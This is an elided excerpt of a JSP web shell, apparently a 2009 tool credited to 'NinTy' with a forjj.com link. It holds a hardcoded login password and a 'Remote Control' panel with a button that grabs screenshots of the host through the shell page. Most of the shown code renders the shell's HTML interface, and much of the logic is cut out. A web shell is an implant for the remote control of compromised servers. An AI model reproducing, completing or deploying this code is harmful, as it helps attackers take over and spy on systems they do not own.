...
<%!
     ...
     * Yue . I Love You.
     */
    private static final String PW = "123"; //password
        ...
        public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
            try {
                ...
                out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
                        "  <tr>"+
                        "    <td>"+
                        "        <h2>Remote Control »</h2><input class=\"bt\" onclick=\"var img = document.getElementById('screen').src='"+SHELL_NAME+"?o=gc&rnd='+Math.random();\" name=\"getsc\" id=\"getsc\" value=\"Get Screen\" type=\"button\" size=\"100\"  />"+
        ...
        public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
            try {
                ...
                out.println("<style type=\"text/css\">"+
                        ...
                        "     "+
                        "<span style=\"font:11px Verdana;\">Copyright © 2009 NinTy </span><a href=\"http://www.forjj.com\" target=\"_blank\">www.Forjj.com</a></p>"+
                        "    </form>");
            } catch (Exception e) {
                e.printStackTrace();
                throw e ;
